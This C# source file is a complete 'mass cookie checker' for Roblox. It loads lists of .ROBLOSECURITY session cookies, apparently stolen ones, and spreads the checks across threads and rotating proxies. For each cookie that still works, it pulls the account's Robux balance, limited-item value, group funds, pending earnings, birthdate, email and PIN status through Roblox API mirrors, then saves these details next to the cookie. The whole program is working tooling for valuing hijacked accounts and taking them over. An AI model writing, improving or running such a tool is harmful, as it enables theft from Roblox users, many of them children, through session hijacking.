using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace RobloxCookieChecker
{
    class Program
    {
        private static ConcurrentDictionary<int, HttpClient> httpClients = new ConcurrentDictionary<int, HttpClient>();
        private static ConcurrentQueue<string> cookieQueue = new ConcurrentQueue<string>();
        private static List<string> proxies = new List<string>();

        private static int validCount = 0;
        private static int invalidCount = 0;
        private static int processedCount = 0;

        private static long rap = 0;
        private static long robux = 0;
        private static long pending = 0;
        private static long groupFunds = 0;
        private static long stipends = 0;
        private static long credit = 0;

        private static object consoleLock = new object();
        private static object statsLock = new object();

        static async Task Main(string[] args)
        {
            Console.Title = "Quasar Mass Cookie Checker V2 | FREE";
            Console.OutputEncoding = Encoding.UTF8;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.DefaultConnectionLimit = 100;

            await InitializeHttpClients();
            await MassCheck();
        }

        static async Task InitializeHttpClients()
        {
            string proxyFilePath = Path.Combine(Directory.GetCurrentDirectory(), "proxies.txt");

            if (File.Exists(proxyFilePath))
            {
                proxies = File.ReadAllLines(proxyFilePath)
                    .Where(p => !string.IsNullOrWhiteSpace(p))
                    .ToList();
            }

            int maxThreads = Environment.ProcessorCount * 2;
            var tasks = new List<Task>();

            for (int i = 0; i < maxThreads; i++)
            {
                int threadId = i;
                tasks.Add(Task.Run(() => CreateHttpClientForThread(threadId)));
            }

            await Task.WhenAll(tasks);
        }

        static void CreateHttpClientForThread(int threadId)
        {
            var handler = new HttpClientHandler();

            if (proxies.Count > 0)
            {
                string proxy = proxies[threadId % proxies.Count].Trim();

                try
                {
                    var proxyUri = new Uri(proxy);
                    handler = new HttpClientHandler
                    {
                        Proxy = new WebProxy(proxyUri),
                        UseProxy = true
                    };
                }
                catch (Exception ex)
                {
                    lock (consoleLock)
                    {
                        Console.WriteLine($"Error setting up proxy for thread {threadId}: {ex.Message}");
                    }
                }
            }

            handler.UseCookies = false;
            handler.AllowAutoRedirect = true;
            handler.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
            handler.UseDefaultCredentials = false;

            var httpClient = new HttpClient(handler);
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
            httpClient.Timeout = TimeSpan.FromSeconds(30);

            httpClients[threadId] = httpClient;
        }

        static void PrintBanner()
        {
            string banner = @"

  █████   █    ██  ▄▄▄        ██████  ▄▄▄       ██▀███  
▒██▓  ██▒ ██  ▓██▒▒████▄    ▒██    ▒ ▒████▄    ▓██ ▒ ██▒
▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ░ ▓██▄   ▒██  ▀█▄  ▓██ ░▄█ ▒
░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██   ▒   ██▒░██▄▄▄▄██ ▒██▀▀█▄  
░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██████▒▒ ▓█   ▓██▒░██▓ ▒██▒
░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░
 ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░▒  ░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░
   ░   ░  ░░░ ░ ░   ░   ▒   ░  ░  ░    ░   ▒     ░░   ░ 
    ░       ░           ░  ░      ░        ░  ░   ░     
                                                        
 QMCC ON TOP!
";

            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine(CenterText(banner));
            Console.ResetColor();
        }

        static string CenterText(string text)
        {
            int consoleWidth = Console.WindowWidth;
            var lines = text.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            var centeredLines = lines.Select(line =>
            {
                if (line.Length >= consoleWidth) return line;
                int spaces = (consoleWidth - line.Length) / 2;
                return new string(' ', spaces) + line;
            });
            return string.Join(Environment.NewLine, centeredLines);
        }

        static void PrintStats()
        {
            string stats = $"[Total Rap]: {rap} | [Total robux]: {robux} | [Total pending]: {pending} | " +
                          $"[Total stipends]: {stipends} | [Total credits]: {credit} | [Total group-founds]: {groupFunds}";

            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine(CenterText(stats));
            Console.WriteLine();
            Console.ResetColor();
        }

        static async Task MassCheck()
        {
            string cookieFilePath = Path.Combine(Directory.GetCurrentDirectory(), "cookies.txt");

            if (!File.Exists(cookieFilePath))
            {
                Console.WriteLine("No cookies.txt file found.");
                Console.ReadKey();
                return;
            }

            string[] cookies = File.ReadAllLines(cookieFilePath)
                .Where(c => !string.IsNullOrWhiteSpace(c))
                .ToArray();

            PrintBanner();
            PrintStats();

            if (cookies.Length > 0)
            {
                Console.WriteLine($"{cookies.Length} Cookie(s) Found");
                Console.WriteLine($"Using {httpClients.Count} threads for processing");
                if (proxies.Count > 0)
                {
                    Console.WriteLine($"Using {proxies.Count} proxies");
                }
                Console.WriteLine();

                string validPath = Path.Combine(Directory.GetCurrentDirectory(), "validcookies.txt");
                string invalidPath = Path.Combine(Directory.GetCurrentDirectory(), "invalidcookies.txt");
                string validFolder = Path.Combine(Directory.GetCurrentDirectory(), "validcookies");

                Directory.CreateDirectory(validFolder);

                try
                {
                    using (File.Create(validPath)) { }
                    using (File.Create(invalidPath)) { }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error creating output files: {ex.Message}");
                    return;
                }

                foreach (var cookie in cookies)
                {
                    cookieQueue.Enqueue(cookie.Trim());
                }

                var processingTasks = new List<Task>();
                var threadIds = httpClients.Keys.ToArray();

                foreach (var threadId in threadIds)
                {
                    processingTasks.Add(ProcessCookies(threadId, validPath, invalidPath, validFolder));
                }

                var progressTask = Task.Run(() => UpdateProgress(cookies.Length));

                await Task.WhenAll(processingTasks);

                await Task.Delay(1000);

                Console.Clear();
                PrintBanner();
                PrintStats();

                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.WriteLine(CenterText($"Valid Cookie(s): {validCount}\nInvalid Cookie(s): {invalidCount}"));
                Console.ResetColor();
            }
            else
            {
                Console.WriteLine("No cookies found in the file.");
            }

            Console.WriteLine("\nPress any key to exit");
            Console.ReadKey();
        }

        static async Task ProcessCookies(int threadId, string validPath, string invalidPath, string validFolder)
        {
            var httpClient = httpClients[threadId];

            string threadValidPath = validPath + $".thread{threadId}.tmp";
            string threadInvalidPath = invalidPath + $".thread{threadId}.tmp";

            if (File.Exists(threadValidPath)) File.Delete(threadValidPath);
            if (File.Exists(threadInvalidPath)) File.Delete(threadInvalidPath);

            while (cookieQueue.TryDequeue(out string cookie))
            {
                try
                {
                    var request = new HttpRequestMessage(HttpMethod.Get, "https://users.roproxy.com/v1/users/authenticated");
                    request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");

                    var response = await httpClient.SendAsync(request);

                    if (response.StatusCode == HttpStatusCode.OK)
                    {
                        Interlocked.Increment(ref validCount);

                        await File.AppendAllTextAsync(threadValidPath, cookie + Environment.NewLine);
                        await ProcessValidCookie(threadId, cookie, validFolder);
                    }
                    else
                    {
                        Interlocked.Increment(ref invalidCount);

                        await File.AppendAllTextAsync(threadInvalidPath, cookie + Environment.NewLine);

                        lock (consoleLock)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"[-] Invalid Cookie (Thread {threadId}) - Status: {response.StatusCode}");
                            Console.ResetColor();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Interlocked.Increment(ref invalidCount);

                    await File.AppendAllTextAsync(threadInvalidPath, cookie + Environment.NewLine);

                    lock (consoleLock)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[-] Error checking Cookie (Thread {threadId}): {ex.Message}");
                        Console.ResetColor();
                    }
                }
                finally
                {
                    Interlocked.Increment(ref processedCount);
                }
            }

            await MergeThreadFiles(threadValidPath, validPath);
            await MergeThreadFiles(threadInvalidPath, invalidPath);

            try
            {
                if (File.Exists(threadValidPath)) File.Delete(threadValidPath);
                if (File.Exists(threadInvalidPath)) File.Delete(threadInvalidPath);
            }
            catch { }
        }

        static async Task MergeThreadFiles(string sourceFile, string destinationFile)
        {
            if (!File.Exists(sourceFile))
                return;

            try
            {
                var content = await File.ReadAllTextAsync(sourceFile);
                if (!string.IsNullOrEmpty(content))
                {
                    using (var stream = new FileStream(destinationFile, FileMode.Append, FileAccess.Write, FileShare.Read))
                    using (var writer = new StreamWriter(stream, Encoding.UTF8))
                    {
                        await writer.WriteAsync(content);
                    }
                }
            }
            catch (Exception ex)
            {
                lock (consoleLock)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"Warning: Failed to merge file {sourceFile}: {ex.Message}");
                    Console.ResetColor();
                }
            }
        }

        static async Task ProcessValidCookie(int threadId, string cookie, string validFolder)
        {
            try
            {
                var httpClient = httpClients[threadId];

                var userData = await GetUserData(httpClient, cookie);
                if (userData != null)
                {
                    long userId = userData.RootElement.GetProperty("id").GetInt64();
                    string username = userData.RootElement.GetProperty("name").GetString() ?? "N/A";
                    string displayName = userData.RootElement.GetProperty("displayName").GetString() ?? "N/A";

                    var accountInfoTask = GetAccountInfo(httpClient, cookie);
                    var securityInfoTask = GetSecurityInfo(httpClient, cookie);
                    var premiumStatusTask = GetPremiumStatus(httpClient, cookie, userId);
                    var birthdateTask = GetBirthdate(httpClient, cookie);
                    var transactionsTask = GetTransactions(httpClient, cookie, userId);
                    var groupsTask = GetGroups(httpClient, cookie, userId);
                    var robuxBalanceTask = GetRobuxBalance(httpClient, cookie, userId);
                    var rapValueTask = GetRapValue(httpClient, cookie, userId);

                    await Task.WhenAll(
                        accountInfoTask,
                        securityInfoTask,
                        premiumStatusTask,
                        birthdateTask,
                        transactionsTask,
                        groupsTask,
                        robuxBalanceTask,
                        rapValueTask
                    );

                    var accountInfo = await accountInfoTask;
                    var securityInfo = await securityInfoTask;
                    bool premium = await premiumStatusTask;
                    string birthdate = await birthdateTask;
                    var transactions = await transactionsTask;
                    var groups = await groupsTask;
                    var robuxData = await robuxBalanceTask;
                    long currentRap = await rapValueTask;

                    bool emailVerified = accountInfo.RootElement.TryGetProperty("verified", out var verifiedProp) ? verifiedProp.GetBoolean() : false;
                    bool pinEnabled = securityInfo.RootElement.TryGetProperty("isEnabled", out var pinProp) ? pinProp.GetBoolean() : false;

                    long currentPending = transactions.RootElement.TryGetProperty("pendingRobuxTotal", out var pendingProp) ? pendingProp.GetInt64() : 0;
                    long currentStipends = transactions.RootElement.TryGetProperty("premiumStipendsTotal", out var stipendsProp) ? stipendsProp.GetInt64() : 0;

                    lock (statsLock)
                    {
                        pending += currentPending;
                        stipends += currentStipends;
                        rap += currentRap;
                    }

                    var groupIds = new List<long>();
                    if (groups.RootElement.TryGetProperty("data", out var dataProp))
                    {
                        groupIds = dataProp.EnumerateArray()
                            .Where(g => g.GetProperty("group").GetProperty("owner").GetProperty("userId").GetInt64() == userId)
                            .Select(g => g.GetProperty("group").GetProperty("id").GetInt64())
                            .ToList();
                    }

                    long currentGroupFunds = await GetGroupFunds(httpClient, cookie, groupIds);

                    lock (statsLock)
                    {
                        groupFunds += currentGroupFunds;
                    }

                    long currentRobux = robuxData.RootElement.GetProperty("robux").GetInt64();

                    lock (statsLock)
                    {
                        robux += currentRobux;
                    }

                    DateTime now = DateTime.Now;

                    string filePath = Path.Combine(validFolder, $"{SanitizeFileName(username)}_cookie.txt");
                    try
                    {
                        using (StreamWriter writer = new StreamWriter(filePath))
                        {
                            await writer.WriteLineAsync($"Username: {username} | " +
                                                       $"UserID: {userId} | " +
                                                       $"Robux: {currentRobux} | " +
                                                       $"Premium: {premium} | " +
                                                       $"Birthday: {birthdate} | " +
                                                       $"Groups: {string.Join(",", groupIds)} | " +
                                                       $"Rap: {currentRap} | " +
                                                       $"Is email verified: {emailVerified} | " +
                                                       $"Group funds: {currentGroupFunds} | " +
                                                       $"Pending: {currentPending} | " +
                                                       $"Premium Stipends: {currentStipends} | " +
                                                       $"Display name: {displayName} | " +
                                                       $"Cookie: {cookie} | " +
                                                       $"QMCC V2 для verrix special. Saved on: {now:dd.MM.yyyy}");
                        }

                        lock (consoleLock)
                        {
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"[+] Valid Cookie (Thread {threadId}) - {username} (Saved to {Path.GetFileName(filePath)})");
                            Console.ResetColor();
                        }
                    }
                    catch (Exception ex)
                    {
                        lock (consoleLock)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"Error saving cookie file for {username}: {ex.Message}");
                            Console.ResetColor();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                lock (consoleLock)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Error processing valid cookie (Thread {threadId}): {ex.Message}");
                    Console.ResetColor();
                }
            }
        }

        static async Task UpdateProgress(int totalCookies)
        {
            while (processedCount < totalCookies)
            {
                lock (consoleLock)
                {
                    Console.Clear();
                    PrintBanner();
                    PrintStats();

                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine($"Progress: {processedCount}/{totalCookies} ({((double)processedCount / totalCookies * 100):F1}%)");
                    Console.WriteLine($"Valid: {validCount} | Invalid: {invalidCount}");
                    Console.ResetColor();
                }

                await Task.Delay(1000);
            }
        }

        static string SanitizeFileName(string fileName)
        {
            foreach (char c in Path.GetInvalidFileNameChars())
            {
                fileName = fileName.Replace(c, '_');
            }
            return fileName;
        }

        static async Task<JsonDocument?> GetUserData(HttpClient httpClient, string cookie)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get, "https://users.roproxy.com/v1/users/authenticated");
                request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");

                var response = await httpClient.SendAsync(request);
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    return JsonDocument.Parse(content);
                }
                return null;
            }
            catch (Exception ex)
            {
                lock (consoleLock)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"Warning: Failed to get user data: {ex.Message}");
                    Console.ResetColor();
                }
                return null;
            }
        }

        static async Task<JsonDocument> GetAccountInfo(HttpClient httpClient, string cookie)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get, "https://accountsettings.roproxy.com/v1/email");
                request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");

                var response = await httpClient.SendAsync(request);
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    return JsonDocument.Parse(content);
                }
                return JsonDocument.Parse("{\"verified\":false,\"emailAddress\":\"N/A\"}");
            }
            catch (Exception ex)
            {
                lock (consoleLock)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"Warning: Failed to get account info: {ex.Message}");
                    Console.ResetColor();
                }
                return JsonDocument.Parse("{\"verified\":false,\"emailAddress\":\"N/A\"}");
            }
        }

        static async Task<JsonDocument> GetSecurityInfo(HttpClient httpClient, string cookie)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get, "https://accountsettings.roproxy.com/v1/pin");
                request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");

                var response = await httpClient.SendAsync(request);
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    return JsonDocument.Parse(content);
                }
                return JsonDocument.Parse("{\"isEnabled\":false}");
            }
            catch (Exception ex)
            {
                lock (consoleLock)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"Warning: Failed to get security info: {ex.Message}");
                    Console.ResetColor();
                }
                return JsonDocument.Parse("{\"isEnabled\":false}");
            }
        }

        static async Task<bool> GetPremiumStatus(HttpClient httpClient, string cookie, long userId)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get,
                    $"https://premiumfeatures.roproxy.com/v1/users/{userId}/validate-membership");
                request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");

                var response = await httpClient.SendAsync(request);
                return !response.IsSuccessStatusCode;
            }
            catch (Exception ex)
            {
                lock (consoleLock)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"Warning: Failed to get premium status: {ex.Message}");
                    Console.ResetColor();
                }
                return false;
            }
        }

        static async Task<string> GetBirthdate(HttpClient httpClient, string cookie)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get, "https://accountinformation.roproxy.com/v1/birthdate");
                request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");

                var response = await httpClient.SendAsync(request);
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    var doc = JsonDocument.Parse(content);
                    return $"{doc.RootElement.GetProperty("birthDay").GetInt32()}/" +
                           $"{doc.RootElement.GetProperty("birthMonth").GetInt32()}/" +
                           $"{doc.RootElement.GetProperty("birthYear").GetInt32()}";
                }
                return "N/A";
            }
            catch (Exception ex)
            {
                lock (consoleLock)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"Warning: Failed to get birthdate: {ex.Message}");
                    Console.ResetColor();
                }
                return "N/A";
            }
        }

        static async Task<JsonDocument> GetTransactions(HttpClient httpClient, string cookie, long userId)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get,
                    $"https://economy.roproxy.com/v2/users/{userId}/transaction-totals?timeFrame=Year&transactionType=summary");
                request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");

                var response = await httpClient.SendAsync(request);
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    return JsonDocument.Parse(content);
                }
                return JsonDocument.Parse("{\"pendingRobuxTotal\":0,\"premiumStipendsTotal\":0}");
            }
            catch (Exception ex)
            {
                lock (consoleLock)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"Warning: Failed to get transactions: {ex.Message}");
                    Console.ResetColor();
                }
                return JsonDocument.Parse("{\"pendingRobuxTotal\":0,\"premiumStipendsTotal\":0}");
            }
        }

        static async Task<JsonDocument> GetGroups(HttpClient httpClient, string cookie, long userId)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get,
                    $"https://groups.roproxy.com/v1/users/{userId}/groups/roles");
                request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");

                var response = await httpClient.SendAsync(request);
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    return JsonDocument.Parse(content);
                }
                return JsonDocument.Parse("{\"data\":[]}");
            }
            catch (Exception ex)
            {
                lock (consoleLock)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"Warning: Failed to get groups: {ex.Message}");
                    Console.ResetColor();
                }
                return JsonDocument.Parse("{\"data\":[]}");
            }
        }

        static async Task<long> GetGroupFunds(HttpClient httpClient, string cookie, List<long> groupIds)
        {
            long totalFunds = 0;
            var tasks = new List<Task<long>>();

            foreach (long groupId in groupIds)
            {
                tasks.Add(GetSingleGroupFunds(httpClient, cookie, groupId));
            }

            var results = await Task.WhenAll(tasks);
            totalFunds = results.Sum();

            return totalFunds;
        }

        static async Task<long> GetSingleGroupFunds(HttpClient httpClient, string cookie, long groupId)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get,
                    $"https://economy.roproxy.com/v1/groups/{groupId}/currency");
                request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");

                var response = await httpClient.SendAsync(request);
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    var doc = JsonDocument.Parse(content);
                    return doc.RootElement.GetProperty("robux").GetInt64();
                }
            }
            catch (Exception ex)
            {
                lock (consoleLock)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"Warning: Failed to get funds for group {groupId}: {ex.Message}");
                    Console.ResetColor();
                }
            }
            return 0;
        }

        static async Task<JsonDocument> GetRobuxBalance(HttpClient httpClient, string cookie, long userId)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get,
                    $"https://economy.roproxy.com/v1/users/{userId}/currency");
                request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");

                var response = await httpClient.SendAsync(request);
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    return JsonDocument.Parse(content);
                }
                return JsonDocument.Parse("{\"robux\":0}");
            }
            catch (Exception ex)
            {
                lock (consoleLock)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"Warning: Failed to get robux balance: {ex.Message}");
                    Console.ResetColor();
                }
                return JsonDocument.Parse("{\"robux\":0}");
            }
        }

        static async Task<long> GetRapValue(HttpClient httpClient, string cookie, long userId)
        {
            long totalRap = 0;
            string? nextCursor = null;

            do
            {
                try
                {
                    string url = $"https://inventory.roproxy.com/v1/users/{userId}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100";
                    if (nextCursor != null)
                    {
                        url += $"&cursor={nextCursor}";
                    }

                    var request = new HttpRequestMessage(HttpMethod.Get, url);
                    request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");

                    var response = await httpClient.SendAsync(request);
                    if (response.IsSuccessStatusCode)
                    {
                        var content = await response.Content.ReadAsStringAsync();
                        using var doc = JsonDocument.Parse(content);

                        foreach (var item in doc.RootElement.GetProperty("data").EnumerateArray())
                        {
                            if (item.TryGetProperty("recentAveragePrice", out var rapProp))
                            {
                                totalRap += rapProp.GetInt64();
                            }
                        }

                        if (doc.RootElement.TryGetProperty("nextPageCursor", out var cursor) &&
                            cursor.ValueKind != JsonValueKind.Null)
                        {
                            nextCursor = cursor.GetString();
                        }
                        else
                        {
                            nextCursor = null;
                        }
                    }
                    else
                    {
                        nextCursor = null;
                    }
                }
                catch (Exception ex)
                {
                    lock (consoleLock)
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"Warning: Failed to get RAP value: {ex.Message}");
                        Console.ResetColor();
                    }
                    nextCursor = null;
                }
            } while (nextCursor != null);

            return totalRap;
        }
    }
}